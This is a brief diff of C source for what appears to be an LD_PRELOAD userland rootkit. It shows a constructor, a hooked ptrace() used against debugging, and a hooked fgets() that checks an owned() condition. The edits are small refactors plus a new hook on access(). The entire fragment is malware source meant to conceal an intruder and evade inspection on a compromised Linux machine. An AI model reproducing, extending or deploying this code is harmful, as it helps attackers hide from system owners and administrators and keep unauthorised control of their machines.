@@ -108,7 +108,6 @@ void __attribute ((constructor)) init(void)
 	#endif 
 } 
 
-
 long int ptrace(enum __ptrace_request request, ...)
 {
 	HOOK(ptrace);
@@ -930,14 +929,14 @@ FILE *fopen(const char *pathname, const char *mode)
 char *fgets(char *s, int size, FILE *stream)
 { 
 
-	char *p;
 	struct stat filestat;
 	HOOK(fgets); 
-	HOOK(__xstat); 
+	HOOK(__xstat);
+        HOOK(access);	
 	#ifdef DEBUG 
 	printf("[!] fgets hooked\n"); 
 	#endif
-	p = old_fgets(s, size, stream);
+	char *p = old_fgets(s, size, stream);
 	if (p == NULL)
 		return(p);
 	if (owned())
